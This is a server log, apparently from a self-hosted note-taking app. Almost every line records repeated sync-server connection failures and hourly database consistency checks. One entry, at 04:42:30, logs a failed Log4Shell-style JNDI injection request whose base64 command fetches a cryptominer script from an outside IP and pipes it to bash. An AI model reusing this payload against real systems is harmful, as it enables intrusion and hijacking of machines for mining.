00:00:31.666 No connection to sync server.
00:01:31.693 No connection to sync server.
00:02:31.694 No connection to sync server.
00:03:31.724 No connection to sync server.
00:04:31.726 No connection to sync server.
00:05:31.731 No connection to sync server.
00:06:31.756 No connection to sync server.
00:07:31.762 No connection to sync server.
00:08:31.782 No connection to sync server.
00:09:31.799 No connection to sync server.
00:10:31.820 No connection to sync server.
00:11:31.822 No connection to sync server.
00:12:31.845 No connection to sync server.
00:13:31.851 No connection to sync server.
00:14:31.869 No connection to sync server.
00:15:31.879 No connection to sync server.
00:16:31.912 No connection to sync server.
00:17:06.732 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
00:17:06.749 All consistency checks passed with no errors detected (took 17ms)
00:17:31.912 No connection to sync server.
00:18:31.933 No connection to sync server.
00:19:31.942 No connection to sync server.
00:20:31.964 No connection to sync server.
00:21:31.969 No connection to sync server.
00:22:31.992 No connection to sync server.
00:23:32.001 No connection to sync server.
00:24:32.029 No connection to sync server.
00:25:32.026 No connection to sync server.
00:26:32.050 No connection to sync server.
00:27:32.055 No connection to sync server.
00:28:32.088 No connection to sync server.
00:29:32.083 No connection to sync server.
00:30:32.112 No connection to sync server.
00:31:32.121 No connection to sync server.
00:32:32.141 No connection to sync server.
00:33:32.142 No connection to sync server.
00:34:32.143 No connection to sync server.
00:35:32.176 No connection to sync server.
00:36:32.167 No connection to sync server.
00:37:32.174 No connection to sync server.
00:38:32.198 No connection to sync server.
00:39:32.206 No connection to sync server.
00:40:32.221 No connection to sync server.
00:41:32.242 No connection to sync server.
00:42:32.250 No connection to sync server.
00:43:32.246 No connection to sync server.
00:44:32.281 No connection to sync server.
00:45:32.275 No connection to sync server.
00:46:32.296 No connection to sync server.
00:47:32.308 No connection to sync server.
00:48:32.327 No connection to sync server.
00:49:32.325 No connection to sync server.
00:50:32.349 No connection to sync server.
00:51:32.364 No connection to sync server.
00:52:32.379 No connection to sync server.
00:53:32.377 No connection to sync server.
00:54:32.406 No connection to sync server.
00:55:32.417 No connection to sync server.
00:56:32.437 No connection to sync server.
00:57:32.436 No connection to sync server.
00:58:32.460 No connection to sync server.
00:59:32.472 No connection to sync server.
01:00:32.495 No connection to sync server.
01:01:32.513 No connection to sync server.
01:02:32.520 No connection to sync server.
01:03:32.541 No connection to sync server.
01:04:32.555 No connection to sync server.
01:05:32.560 No connection to sync server.
01:06:32.575 No connection to sync server.
01:07:32.581 No connection to sync server.
01:08:32.591 No connection to sync server.
01:09:32.600 No connection to sync server.
01:10:32.617 No connection to sync server.
01:11:32.634 No connection to sync server.
01:12:32.650 No connection to sync server.
01:13:32.659 No connection to sync server.
01:14:32.677 No connection to sync server.
01:15:32.689 No connection to sync server.
01:16:32.707 No connection to sync server.
01:17:06.736 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
01:17:06.753 All consistency checks passed with no errors detected (took 18ms)
01:17:32.711 No connection to sync server.
01:18:32.726 No connection to sync server.
01:19:32.747 No connection to sync server.
01:20:32.750 No connection to sync server.
01:21:32.768 No connection to sync server.
01:22:32.770 No connection to sync server.
01:23:32.799 No connection to sync server.
01:24:32.802 No connection to sync server.
01:25:32.829 No connection to sync server.
01:26:32.824 No connection to sync server.
01:27:32.861 No connection to sync server.
01:28:32.850 No connection to sync server.
01:29:32.867 No connection to sync server.
01:30:32.880 No connection to sync server.
01:31:32.888 No connection to sync server.
01:32:32.912 No connection to sync server.
01:33:32.926 No connection to sync server.
01:34:32.942 No connection to sync server.
01:35:32.957 No connection to sync server.
01:36:32.956 No connection to sync server.
01:37:32.975 No connection to sync server.
01:38:32.976 No connection to sync server.
01:39:33.015 No connection to sync server.
01:40:33.016 No connection to sync server.
01:41:33.034 No connection to sync server.
01:42:33.041 No connection to sync server.
01:43:33.063 No connection to sync server.
01:44:33.072 No connection to sync server.
01:45:33.082 No connection to sync server.
01:46:33.096 No connection to sync server.
01:47:33.097 No connection to sync server.
01:48:33.128 No connection to sync server.
01:49:33.126 No connection to sync server.
01:50:33.166 No connection to sync server.
01:51:33.158 No connection to sync server.
01:52:33.179 No connection to sync server.
01:53:33.191 No connection to sync server.
01:54:33.205 No connection to sync server.
01:55:33.202 No connection to sync server.
01:56:33.236 No connection to sync server.
01:57:33.229 No connection to sync server.
01:58:33.257 No connection to sync server.
01:59:33.260 No connection to sync server.
02:00:33.292 No connection to sync server.
02:01:34.370 No connection to sync server.
02:02:33.296 No connection to sync server.
02:03:33.325 No connection to sync server.
02:04:33.329 No connection to sync server.
02:05:33.349 No connection to sync server.
02:06:33.348 No connection to sync server.
02:07:33.380 No connection to sync server.
02:08:33.385 No connection to sync server.
02:09:33.404 No connection to sync server.
02:10:33.420 No connection to sync server.
02:11:33.443 No connection to sync server.
02:12:33.455 No connection to sync server.
02:13:33.461 No connection to sync server.
02:14:33.473 No connection to sync server.
02:15:33.500 No connection to sync server.
02:16:33.496 No connection to sync server.
02:17:06.736 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
02:17:06.761 All consistency checks passed with no errors detected (took 26ms)
02:17:33.518 No connection to sync server.
02:18:33.527 No connection to sync server.
02:19:33.552 No connection to sync server.
02:20:33.560 No connection to sync server.
02:21:33.580 No connection to sync server.
02:22:33.575 No connection to sync server.
02:23:33.609 No connection to sync server.
02:24:33.607 No connection to sync server.
02:25:33.646 No connection to sync server.
02:26:33.643 No connection to sync server.
02:27:33.666 No connection to sync server.
02:28:33.662 No connection to sync server.
02:29:33.682 No connection to sync server.
02:30:33.697 No connection to sync server.
02:31:33.717 No connection to sync server.
02:32:33.705 No connection to sync server.
02:33:33.730 No connection to sync server.
02:34:33.745 No connection to sync server.
02:35:33.762 No connection to sync server.
02:36:33.771 No connection to sync server.
02:37:33.789 No connection to sync server.
02:38:33.798 No connection to sync server.
02:39:33.824 No connection to sync server.
02:40:33.836 No connection to sync server.
02:41:33.859 No connection to sync server.
02:42:33.850 No connection to sync server.
02:43:33.868 No connection to sync server.
02:44:33.882 No connection to sync server.
02:45:33.879 No connection to sync server.
02:46:33.904 No connection to sync server.
02:47:33.899 No connection to sync server.
02:48:33.932 No connection to sync server.
02:49:33.929 No connection to sync server.
02:50:33.934 No connection to sync server.
02:51:33.962 No connection to sync server.
02:52:33.971 No connection to sync server.
02:53:33.986 No connection to sync server.
02:54:33.997 No connection to sync server.
02:55:34.019 No connection to sync server.
02:56:34.012 No connection to sync server.
02:57:34.056 No connection to sync server.
02:58:34.045 No connection to sync server.
02:59:34.065 No connection to sync server.
03:00:34.070 No connection to sync server.
03:01:34.094 No connection to sync server.
03:02:34.109 No connection to sync server.
03:03:34.117 No connection to sync server.
03:04:34.133 No connection to sync server.
03:05:34.125 No connection to sync server.
03:06:34.134 No connection to sync server.
03:07:34.124 No connection to sync server.
03:08:34.127 No connection to sync server.
03:09:34.159 No connection to sync server.
03:10:34.161 No connection to sync server.
03:11:34.178 No connection to sync server.
03:12:34.180 No connection to sync server.
03:13:34.206 No connection to sync server.
03:14:34.211 No connection to sync server.
03:15:34.209 No connection to sync server.
03:16:34.216 No connection to sync server.
03:17:06.740 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
03:17:06.761 All consistency checks passed with no errors detected (took 22ms)
03:17:34.243 No connection to sync server.
03:18:34.253 No connection to sync server.
03:19:34.270 No connection to sync server.
03:20:34.304 No connection to sync server.
03:21:34.305 No connection to sync server.
03:22:34.307 No connection to sync server.
03:23:34.328 No connection to sync server.
03:24:34.333 No connection to sync server.
03:25:34.342 No connection to sync server.
03:26:34.360 No connection to sync server.
03:27:34.357 No connection to sync server.
03:28:34.373 No connection to sync server.
03:29:34.384 No connection to sync server.
03:30:34.398 No connection to sync server.
03:31:34.423 No connection to sync server.
03:32:34.425 No connection to sync server.
03:33:34.444 No connection to sync server.
03:34:34.466 No connection to sync server.
03:35:34.475 No connection to sync server.
03:36:34.484 No connection to sync server.
03:37:34.483 No connection to sync server.
03:38:34.511 No connection to sync server.
03:39:34.516 No connection to sync server.
03:40:34.537 No connection to sync server.
03:41:34.539 No connection to sync server.
03:42:34.561 No connection to sync server.
03:43:34.569 No connection to sync server.
03:44:34.589 No connection to sync server.
03:45:34.582 No connection to sync server.
03:46:34.622 No connection to sync server.
03:47:34.618 No connection to sync server.
03:48:34.625 No connection to sync server.
03:49:34.657 No connection to sync server.
03:50:34.644 No connection to sync server.
03:51:34.660 No connection to sync server.
03:52:34.671 No connection to sync server.
03:53:34.692 No connection to sync server.
03:54:34.696 No connection to sync server.
03:55:34.717 No connection to sync server.
03:56:34.715 No connection to sync server.
03:57:34.732 No connection to sync server.
03:58:34.742 No connection to sync server.
03:59:34.765 No connection to sync server.
04:00:34.771 No connection to sync server.
04:01:34.781 No connection to sync server.
04:02:34.788 No connection to sync server.
04:03:34.816 No connection to sync server.
04:04:34.834 No connection to sync server.
04:05:34.843 No connection to sync server.
04:06:34.853 No connection to sync server.
04:07:34.856 No connection to sync server.
04:08:34.876 No connection to sync server.
04:09:34.890 No connection to sync server.
04:10:34.900 No connection to sync server.
04:11:34.916 No connection to sync server.
04:12:34.918 No connection to sync server.
04:13:34.935 No connection to sync server.
04:14:34.956 No connection to sync server.
04:15:34.965 No connection to sync server.
04:16:34.976 No connection to sync server.
04:17:06.743 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
04:17:06.764 All consistency checks passed with no errors detected (took 21ms)
04:17:34.990 No connection to sync server.
04:18:34.998 No connection to sync server.
04:19:35.006 No connection to sync server.
04:20:35.027 No connection to sync server.
04:21:35.024 No connection to sync server.
04:22:35.052 No connection to sync server.
04:23:35.056 No connection to sync server.
04:24:35.080 No connection to sync server.
04:25:35.084 No connection to sync server.
04:26:35.104 No connection to sync server.
04:27:35.110 No connection to sync server.
04:28:35.130 No connection to sync server.
04:29:35.141 No connection to sync server.
04:30:35.156 No connection to sync server.
04:31:35.160 No connection to sync server.
04:32:35.175 No connection to sync server.
04:33:35.187 No connection to sync server.
04:34:35.215 No connection to sync server.
04:35:35.215 No connection to sync server.
04:36:35.234 No connection to sync server.
04:37:35.234 No connection to sync server.
04:38:35.262 No connection to sync server.
04:39:35.266 No connection to sync server.
04:40:35.288 No connection to sync server.
04:41:35.288 No connection to sync server.
04:42:30.013 Error: Router not found for request GET /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//46.8.231.224:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMzEuMjI0L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjMxLjIyNC9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==%7D%27%29
04:42:35.324 No connection to sync server.
04:43:35.306 No connection to sync server.
04:44:35.331 No connection to sync server.
04:45:35.336 No connection to sync server.
04:46:35.343 No connection to sync server.
04:47:35.364 No connection to sync server.
04:48:35.367 No connection to sync server.
04:49:35.386 No connection to sync server.
04:50:35.392 No connection to sync server.
04:51:35.415 No connection to sync server.
04:52:35.408 No connection to sync server.
04:53:35.435 No connection to sync server.
04:54:35.448 No connection to sync server.
04:55:35.454 No connection to sync server.
04:56:35.455 No connection to sync server.
04:57:35.472 No connection to sync server.
04:58:35.477 No connection to sync server.
04:59:35.513 No connection to sync server.
05:00:35.508 No connection to sync server.
05:01:35.515 No connection to sync server.
05:02:35.530 No connection to sync server.
05:03:35.529 No connection to sync server.
05:04:35.558 No connection to sync server.
05:05:35.563 No connection to sync server.
05:06:35.586 No connection to sync server.
05:07:35.597 No connection to sync server.
05:08:35.610 No connection to sync server.
05:09:35.626 No connection to sync server.
05:10:35.631 No connection to sync server.
05:11:35.634 No connection to sync server.
05:12:35.656 No connection to sync server.
05:13:35.662 No connection to sync server.
05:14:35.670 No connection to sync server.
05:15:35.683 No connection to sync server.
05:16:35.690 No connection to sync server.
05:17:06.747 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
05:17:06.762 All consistency checks passed with no errors detected (took 15ms)
05:17:35.698 No connection to sync server.
05:18:35.713 No connection to sync server.
05:19:35.731 No connection to sync server.
05:20:35.746 No connection to sync server.
05:21:35.756 No connection to sync server.
05:22:35.768 No connection to sync server.
05:23:35.772 No connection to sync server.
05:24:35.800 No connection to sync server.
05:25:35.800 No connection to sync server.
05:26:35.800 No connection to sync server.
05:27:35.816 No connection to sync server.
05:28:35.836 No connection to sync server.
05:29:35.843 No connection to sync server.
05:30:35.851 No connection to sync server.
05:31:35.860 No connection to sync server.
05:32:35.879 No connection to sync server.
05:33:35.890 No connection to sync server.
05:34:35.905 No connection to sync server.
05:35:35.916 No connection to sync server.
05:36:35.935 No connection to sync server.
05:37:35.925 No connection to sync server.
05:38:35.979 No connection to sync server.
05:39:35.959 No connection to sync server.
05:40:35.956 No connection to sync server.
05:41:35.971 No connection to sync server.
05:42:35.988 No connection to sync server.
05:43:36.001 No connection to sync server.
05:44:36.006 No connection to sync server.
05:45:36.037 No connection to sync server.
05:46:36.028 No connection to sync server.
05:47:36.048 No connection to sync server.
05:48:36.049 No connection to sync server.
05:49:36.069 No connection to sync server.
05:50:36.080 No connection to sync server.
05:51:36.107 No connection to sync server.
05:52:36.106 No connection to sync server.
05:53:36.126 No connection to sync server.
05:54:36.116 No connection to sync server.
05:55:36.140 No connection to sync server.
05:56:36.150 No connection to sync server.
05:57:36.159 No connection to sync server.
05:58:36.173 No connection to sync server.
05:59:36.172 No connection to sync server.
06:00:36.186 No connection to sync server.
06:01:36.194 No connection to sync server.
06:02:36.203 No connection to sync server.
06:03:36.218 No connection to sync server.
06:04:36.232 No connection to sync server.
06:05:36.245 No connection to sync server.
06:06:36.244 No connection to sync server.
06:07:36.264 No connection to sync server.
06:08:36.271 No connection to sync server.
06:09:36.305 No connection to sync server.
06:10:36.296 No connection to sync server.
06:11:36.309 No connection to sync server.
06:12:36.322 No connection to sync server.
06:13:36.334 No connection to sync server.
06:14:36.350 No connection to sync server.
06:15:36.362 No connection to sync server.
06:16:36.363 No connection to sync server.
06:17:06.747 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
06:17:06.761 All consistency checks passed with no errors detected (took 14ms)
06:17:36.386 No connection to sync server.
06:18:36.387 No connection to sync server.
06:19:36.408 No connection to sync server.
06:20:36.409 No connection to sync server.
06:21:36.482 No connection to sync server.
06:22:36.445 No connection to sync server.
06:23:36.452 No connection to sync server.
06:24:36.462 No connection to sync server.
06:25:36.473 No connection to sync server.
06:26:36.478 No connection to sync server.
06:27:36.503 No connection to sync server.
06:28:36.500 No connection to sync server.
06:29:36.516 No connection to sync server.
06:30:36.514 No connection to sync server.
06:31:36.539 No connection to sync server.
06:32:36.545 No connection to sync server.
06:33:36.567 No connection to sync server.
06:34:36.581 No connection to sync server.
06:35:36.579 No connection to sync server.
06:36:36.595 No connection to sync server.
06:37:36.614 No connection to sync server.
06:38:36.625 No connection to sync server.
06:39:36.635 No connection to sync server.
06:40:36.633 No connection to sync server.
06:41:36.649 No connection to sync server.
06:42:36.652 No connection to sync server.
06:43:36.676 No connection to sync server.
06:44:36.687 No connection to sync server.
06:45:36.677 No connection to sync server.
06:46:36.695 No connection to sync server.
06:47:36.711 No connection to sync server.
06:48:36.700 No connection to sync server.
06:49:36.727 No connection to sync server.
06:50:36.723 No connection to sync server.
06:51:36.740 No connection to sync server.
06:52:36.753 No connection to sync server.
06:53:36.757 No connection to sync server.
06:54:36.781 No connection to sync server.
06:55:36.780 No connection to sync server.
06:56:36.799 No connection to sync server.
06:57:36.808 No connection to sync server.
06:58:36.820 No connection to sync server.
06:59:36.828 No connection to sync server.
07:00:36.846 No connection to sync server.
07:00:42.304 Error: Router not found for request POST /
07:01:36.860 No connection to sync server.
07:02:36.872 No connection to sync server.
07:03:36.876 No connection to sync server.
07:04:36.899 No connection to sync server.
07:05:36.908 No connection to sync server.
07:06:36.913 No connection to sync server.
07:07:36.933 No connection to sync server.
07:08:36.931 No connection to sync server.
07:09:36.941 No connection to sync server.
07:10:36.947 No connection to sync server.
07:11:36.949 No connection to sync server.
07:12:36.979 No connection to sync server.
07:13:36.973 No connection to sync server.
07:14:37.005 No connection to sync server.
07:15:37.002 No connection to sync server.
07:16:37.019 No connection to sync server.
07:17:06.748 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
07:17:06.763 All consistency checks passed with no errors detected (took 15ms)
07:17:37.024 No connection to sync server.
07:18:37.038 No connection to sync server.
07:19:37.038 No connection to sync server.
07:20:37.061 No connection to sync server.
07:21:37.057 No connection to sync server.
07:22:37.086 No connection to sync server.
07:23:37.085 No connection to sync server.
07:24:37.115 No connection to sync server.
07:25:37.110 No connection to sync server.
07:26:37.120 No connection to sync server.
07:27:37.134 No connection to sync server.
07:28:37.136 No connection to sync server.
07:29:37.140 No connection to sync server.
07:30:37.156 No connection to sync server.
07:31:37.156 No connection to sync server.
07:32:37.166 No connection to sync server.
07:33:37.177 No connection to sync server.
07:34:37.172 No connection to sync server.
07:35:37.190 No connection to sync server.
07:36:37.196 No connection to sync server.
07:37:37.224 No connection to sync server.
07:38:37.228 No connection to sync server.
07:39:37.252 No connection to sync server.
07:40:37.245 No connection to sync server.
07:41:37.259 No connection to sync server.
07:42:37.271 No connection to sync server.
07:43:37.278 No connection to sync server.
07:44:37.294 No connection to sync server.
07:45:37.300 No connection to sync server.
07:46:37.312 No connection to sync server.
07:47:37.324 No connection to sync server.
07:48:37.336 No connection to sync server.
07:49:37.343 No connection to sync server.
07:50:37.360 No connection to sync server.
07:51:37.371 No connection to sync server.
07:52:37.383 No connection to sync server.
07:53:37.391 No connection to sync server.
07:54:37.402 No connection to sync server.
07:55:37.412 No connection to sync server.
07:56:37.429 No connection to sync server.
07:57:37.426 No connection to sync server.
07:58:37.445 No connection to sync server.
07:59:37.457 No connection to sync server.
08:00:37.469 No connection to sync server.
08:01:37.477 No connection to sync server.
08:02:37.491 No connection to sync server.
08:03:37.496 No connection to sync server.
08:04:37.498 No connection to sync server.
08:05:37.508 No connection to sync server.
08:06:37.520 No connection to sync server.
08:07:37.543 No connection to sync server.
08:08:37.550 No connection to sync server.
08:09:37.552 No connection to sync server.
08:10:37.564 No connection to sync server.
08:11:37.559 No connection to sync server.
08:12:37.596 No connection to sync server.
08:13:37.580 No connection to sync server.
08:14:37.605 No connection to sync server.
08:15:37.599 No connection to sync server.
08:16:37.629 No connection to sync server.
08:17:06.629 Optimizing database
08:17:06.630 Optimization finished in 1ms.
08:17:06.750 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
08:17:06.776 All consistency checks passed with no errors detected (took 27ms)
08:17:37.615 No connection to sync server.
08:18:37.636 No connection to sync server.
08:19:37.641 No connection to sync server.
08:20:37.651 No connection to sync server.
08:21:37.662 No connection to sync server.
08:22:37.684 No connection to sync server.
08:23:37.693 No connection to sync server.
08:24:37.693 No connection to sync server.
08:25:37.706 No connection to sync server.
08:26:37.701 No connection to sync server.
08:27:37.724 No connection to sync server.
08:28:37.729 No connection to sync server.
08:29:37.749 No connection to sync server.
08:30:37.749 No connection to sync server.
08:31:37.771 No connection to sync server.
08:32:37.774 No connection to sync server.
08:33:37.789 No connection to sync server.
08:34:37.792 No connection to sync server.
08:35:37.807 No connection to sync server.
08:36:37.813 No connection to sync server.
08:37:37.844 No connection to sync server.
08:38:37.830 No connection to sync server.
08:39:37.858 No connection to sync server.
08:40:37.865 No connection to sync server.
08:41:37.877 No connection to sync server.
08:42:37.872 No connection to sync server.
08:43:37.895 No connection to sync server.
08:44:37.894 No connection to sync server.
08:45:37.906 No connection to sync server.
08:46:37.911 No connection to sync server.
08:47:37.936 No connection to sync server.
08:48:37.971 No connection to sync server.
08:49:37.989 No connection to sync server.
08:50:37.947 No connection to sync server.
08:51:37.978 No connection to sync server.
08:52:37.980 No connection to sync server.
08:53:37.996 No connection to sync server.
08:54:37.983 No connection to sync server.
08:55:37.997 No connection to sync server.
08:56:38.004 No connection to sync server.
08:57:38.013 No connection to sync server.
08:58:38.032 No connection to sync server.
08:59:38.044 No connection to sync server.
09:00:38.038 No connection to sync server.
09:01:38.059 No connection to sync server.
09:02:38.059 No connection to sync server.
09:03:38.075 No connection to sync server.
09:04:38.086 No connection to sync server.
09:05:38.105 No connection to sync server.
09:06:38.095 No connection to sync server.
09:07:38.104 No connection to sync server.
09:08:38.127 No connection to sync server.
09:09:38.123 No connection to sync server.
09:10:38.152 No connection to sync server.
09:11:38.148 No connection to sync server.
09:12:38.161 No connection to sync server.
09:13:38.167 No connection to sync server.
09:14:38.178 No connection to sync server.
09:15:38.188 No connection to sync server.
09:16:38.194 No connection to sync server.
09:17:06.753 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
09:17:06.770 All consistency checks passed with no errors detected (took 18ms)
09:17:38.214 No connection to sync server.
09:18:38.217 No connection to sync server.
09:19:38.241 No connection to sync server.
09:20:38.239 No connection to sync server.
09:21:38.247 No connection to sync server.
09:22:38.259 No connection to sync server.
09:23:38.265 No connection to sync server.
09:24:38.275 No connection to sync server.
09:25:38.288 No connection to sync server.
09:26:38.323 No connection to sync server.
09:27:38.303 No connection to sync server.
09:28:38.315 No connection to sync server.
09:29:38.312 No connection to sync server.
09:30:38.338 No connection to sync server.
09:31:38.326 No connection to sync server.
09:32:38.343 No connection to sync server.
09:33:38.343 No connection to sync server.
09:34:38.402 No connection to sync server.
09:35:38.368 No connection to sync server.
09:36:38.379 No connection to sync server.
09:37:38.392 No connection to sync server.
09:38:38.393 No connection to sync server.
09:39:38.401 No connection to sync server.
09:40:38.416 No connection to sync server.
09:41:38.420 No connection to sync server.
09:42:38.434 No connection to sync server.
09:43:38.451 No connection to sync server.
09:44:38.459 No connection to sync server.
09:45:38.464 No connection to sync server.
09:46:38.475 No connection to sync server.
09:47:38.479 No connection to sync server.
09:48:38.498 No connection to sync server.
09:49:38.511 No connection to sync server.
09:50:38.504 No connection to sync server.
09:51:38.518 No connection to sync server.
09:52:38.529 No connection to sync server.
09:53:38.539 No connection to sync server.
09:54:38.552 No connection to sync server.
09:55:38.552 No connection to sync server.
09:56:38.568 No connection to sync server.
09:57:38.574 No connection to sync server.
09:58:38.588 No connection to sync server.
09:59:38.588 No connection to sync server.
10:00:38.598 No connection to sync server.
10:01:38.614 No connection to sync server.
10:02:38.614 No connection to sync server.
10:03:38.625 No connection to sync server.
10:04:38.645 No connection to sync server.
10:05:38.642 No connection to sync server.
10:06:38.654 No connection to sync server.
10:07:38.657 No connection to sync server.
10:08:38.671 No connection to sync server.
10:09:38.672 No connection to sync server.
10:10:38.682 No connection to sync server.
10:11:38.700 No connection to sync server.
10:12:38.705 No connection to sync server.
10:13:38.710 No connection to sync server.
10:14:38.721 No connection to sync server.
10:15:38.721 No connection to sync server.
10:16:38.747 No connection to sync server.
10:17:06.754 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
10:17:06.770 All consistency checks passed with no errors detected (took 17ms)
10:17:38.743 No connection to sync server.
10:18:38.757 No connection to sync server.
10:19:38.752 No connection to sync server.
10:20:38.770 No connection to sync server.
10:21:38.772 No connection to sync server.
10:22:38.788 No connection to sync server.
10:23:38.790 No connection to sync server.
10:24:38.800 No connection to sync server.
10:25:38.809 No connection to sync server.
10:26:38.813 No connection to sync server.
10:27:38.825 No connection to sync server.
10:28:38.824 No connection to sync server.
10:29:38.841 No connection to sync server.
10:30:38.851 No connection to sync server.
10:31:38.855 No connection to sync server.
10:32:38.867 No connection to sync server.
10:33:38.875 No connection to sync server.
10:34:38.887 No connection to sync server.
10:35:38.894 No connection to sync server.
10:36:38.896 No connection to sync server.
10:37:38.906 No connection to sync server.
10:38:38.904 No connection to sync server.
10:39:38.917 No connection to sync server.
10:40:38.928 No connection to sync server.
10:41:38.939 No connection to sync server.
10:42:38.946 No connection to sync server.
10:43:38.955 No connection to sync server.
10:44:38.964 No connection to sync server.
10:45:38.965 No connection to sync server.
10:46:38.984 No connection to sync server.
10:47:38.990 No connection to sync server.
10:48:38.998 No connection to sync server.
10:49:39.017 No connection to sync server.
10:50:39.024 No connection to sync server.
10:51:39.016 No connection to sync server.
10:52:39.033 No connection to sync server.
10:53:39.044 No connection to sync server.
10:54:39.053 No connection to sync server.
10:55:39.046 No connection to sync server.
10:56:39.060 No connection to sync server.
10:57:39.070 No connection to sync server.
10:58:39.084 No connection to sync server.
10:59:39.087 No connection to sync server.
11:00:39.093 No connection to sync server.
11:01:39.104 No connection to sync server.
11:02:39.115 No connection to sync server.
11:03:39.116 No connection to sync server.
11:04:39.123 No connection to sync server.
11:05:39.127 No connection to sync server.
11:06:39.144 No connection to sync server.
11:07:39.150 No connection to sync server.
11:08:39.159 No connection to sync server.
11:09:39.166 No connection to sync server.
11:10:39.184 No connection to sync server.
11:11:39.186 No connection to sync server.
11:12:39.192 No connection to sync server.
11:13:39.205 No connection to sync server.
11:14:39.214 No connection to sync server.
11:15:39.208 No connection to sync server.
11:16:39.221 No connection to sync server.
11:17:06.757 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
11:17:06.780 All consistency checks passed with no errors detected (took 23ms)
11:17:39.235 No connection to sync server.
11:18:39.243 No connection to sync server.
11:19:39.235 No connection to sync server.
11:20:39.255 No connection to sync server.
11:21:39.253 No connection to sync server.
11:22:39.261 No connection to sync server.
11:23:39.270 No connection to sync server.
11:24:39.283 No connection to sync server.
11:25:39.292 No connection to sync server.
11:26:39.303 No connection to sync server.
11:27:39.308 No connection to sync server.
11:28:39.326 No connection to sync server.
11:29:39.317 No connection to sync server.
11:30:39.334 No connection to sync server.
11:31:39.332 No connection to sync server.
11:32:39.340 No connection to sync server.
11:33:39.350 No connection to sync server.
11:34:39.344 No connection to sync server.
11:35:39.356 No connection to sync server.
11:36:39.357 No connection to sync server.
11:37:39.377 No connection to sync server.
11:38:39.379 No connection to sync server.
11:39:39.388 No connection to sync server.
11:40:39.395 No connection to sync server.
11:41:39.416 No connection to sync server.
11:42:39.404 No connection to sync server.
11:43:39.419 No connection to sync server.
11:44:39.424 No connection to sync server.
11:45:39.431 No connection to sync server.
11:46:39.435 No connection to sync server.
11:47:39.440 No connection to sync server.
11:48:39.457 No connection to sync server.
11:49:39.445 No connection to sync server.
11:50:39.455 No connection to sync server.
11:51:39.465 No connection to sync server.
11:52:39.478 No connection to sync server.
11:53:39.476 No connection to sync server.
11:54:39.492 No connection to sync server.
11:55:39.497 No connection to sync server.
11:56:39.512 No connection to sync server.
11:57:39.520 No connection to sync server.
11:58:39.528 No connection to sync server.
11:59:39.535 No connection to sync server.
12:00:39.533 No connection to sync server.
12:01:39.542 No connection to sync server.
12:02:39.560 No connection to sync server.
12:03:39.558 No connection to sync server.
12:04:39.560 No connection to sync server.
12:05:39.575 No connection to sync server.
12:06:39.572 No connection to sync server.
12:07:39.583 No connection to sync server.
12:08:39.596 No connection to sync server.
12:09:39.593 No connection to sync server.
12:10:39.594 No connection to sync server.
12:11:39.612 No connection to sync server.
12:12:39.615 No connection to sync server.
12:13:39.637 No connection to sync server.
12:14:39.638 No connection to sync server.
12:15:39.642 No connection to sync server.
12:16:39.636 No connection to sync server.
12:17:06.761 Table counts: notes: 308, revisions: 122, attachments: 66, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
12:17:06.780 All consistency checks passed with no errors detected (took 19ms)
12:17:39.650 No connection to sync server.
12:18:39.655 No connection to sync server.
12:19:39.663 No connection to sync server.
12:20:39.674 No connection to sync server.
12:21:39.677 No connection to sync server.
12:22:39.675 No connection to sync server.
12:23:39.759 No connection to sync server.
12:24:39.687 No connection to sync server.
12:25:39.696 No connection to sync server.
12:26:39.692 No connection to sync server.
12:27:39.705 No connection to sync server.
12:28:39.723 No connection to sync server.
12:29:39.715 No connection to sync server.
12:30:39.726 No connection to sync server.
12:31:39.739 No connection to sync server.
12:32:39.731 No connection to sync server.
12:33:39.751 No connection to sync server.
12:34:39.757 No connection to sync server.
12:35:39.756 No connection to sync server.
12:36:39.769 No connection to sync server.
12:37:39.771 No connection to sync server.
12:38:39.777 No connection to sync server.
12:39:39.787 No connection to sync server.
12:40:39.792 No connection to sync server.
12:41:39.802 No connection to sync server.
12:42:39.810 No connection to sync server.
12:43:39.811 No connection to sync server.
12:44:39.824 No connection to sync server.
12:45:39.821 No connection to sync server.
12:46:39.841 No connection to sync server.
12:47:39.845 No connection to sync server.
12:48:39.856 No connection to sync server.
12:49:39.847 No connection to sync server.
12:50:39.858 No connection to sync server.
12:51:39.863 No connection to sync server.
12:52:39.864 No connection to sync server.
12:53:39.875 No connection to sync server.
12:54:39.879 No connection to sync server.
12:55:39.890 No connection to sync server.
12:56:39.896 No connection to sync server.
12:57:39.907 No connection to sync server.
12:58:39.905 No connection to sync server.
12:59:39.906 No connection to sync server.
13:00:39.911 No connection to sync server.
13:01:39.916 No connection to sync server.
13:02:39.924 No connection to sync server.
13:03:39.931 No connection to sync server.
13:04:39.929 No connection to sync server.
13:05:39.945 No connection to sync server.
13:06:39.950 No connection to sync server.
